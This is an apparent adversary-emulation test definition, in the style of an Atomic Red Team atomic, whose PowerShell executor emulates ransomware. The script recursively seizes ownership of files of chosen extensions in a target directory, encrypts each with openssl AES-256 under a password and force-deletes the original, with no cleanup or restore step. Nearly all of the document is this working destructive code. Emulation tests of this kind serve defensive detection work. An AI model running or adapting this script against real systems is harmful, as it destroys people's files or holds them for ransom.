    executor:
      name: powershell
      elevation_required: true
      command: |
        $password = "#{encryption_password}"
        $targetDir = "#{target_directory}"
        $extensions = #{target_extensions}

        if (-Not (Test-Path $targetDir)) {
            Write-Host "‚ùå The target directory $targetDir does not exist."
            exit 1
        }

        Write-Host "‚úÖ Starting encryption process..."

        # Define the real-time feedback script
        $realTimeFeedbackScript = @"
        `$password = '$password'
        `$targetDir = '$targetDir'
        `$extensions = @($($extensions -join ","))

        foreach (`$ext in `$extensions) {
            Get-ChildItem -Path `$targetDir -Recurse -Filter "*`$ext" -File -ErrorAction SilentlyContinue | ForEach-Object {
                `$file = `$_.FullName
                Write-Host 'üîç Processing file: `$file'
                try {
                    takeown /F `$file /A | Out-Null
                    icacls `$file /grant Administrators:F /T /C | Out-Null
                } catch {
                    Write-Host '‚ùå Failed to set permissions for: `$file'
                    return
                }

                `$encryptedFile = '`$file.enc'
                Write-Host 'üîí Encrypting file: `$file -> `$encryptedFile'
                openssl enc -aes-256-cbc -salt -pbkdf2 -iter 10000 -in `$file -out `$encryptedFile -pass pass:`$password

                if (`$LASTEXITCODE -eq 0) {
                    Remove-Item -Path `$file -Force
                    Write-Host '‚úÖ le fichier `$file est crypt√©'
                } else {
                    Write-Host '‚ùå error le fichier `$file n''est pas crypt√©'
                }
            }
        }

        Write-Host '‚úÖ Encryption and deletion process completed!'
"@

        # Launch a new PowerShell window for real-time feedback
        Start-Process powershell.exe -ArgumentList "-NoExit", "-Command", $realTimeFeedbackScript

      cleanup_command: |
        Write-Host "No cleanup performed for destructive actions. To recover encrypted files, use the decryption password provided."
